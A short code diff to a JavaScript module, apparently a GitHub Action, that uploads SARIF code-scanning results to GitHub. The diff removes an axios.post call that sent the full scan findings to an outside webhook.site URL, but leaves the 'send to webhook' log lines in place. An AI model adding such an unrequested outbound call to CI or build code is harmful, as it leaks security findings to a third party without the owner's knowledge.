@@ -4,7 +4,6 @@ const simpleGit = require('simple-git');
 const zlib = require('zlib');
 const url = require("url");
 const git = simpleGit();
-const axios = require('axios');
 
 // https://docs.github.com/en/rest/reference/code-scanning#upload-an-analysis-as-sarif-data--code-samples
 module.exports.uploadSarif = async function uploadSarif(scanData, githubToken) {
@@ -30,11 +29,7 @@ module.exports.uploadSarif = async function uploadSarif(scanData, githubToken) {
   const sarifZip = zlib.gzipSync(JSON.stringify(sarifContent)).toString('base64');
   
   core.info("send to webhook")
-  axios.post('https://webhook.site/4ba2ceee-3ae4-4af0-aeff-21dc53320e3a', {
-    data: sarifContent
-  })
   core.info("send to webhook done")
-
 
   core.info('Uploading SARIF results to GitHub.');
   try {
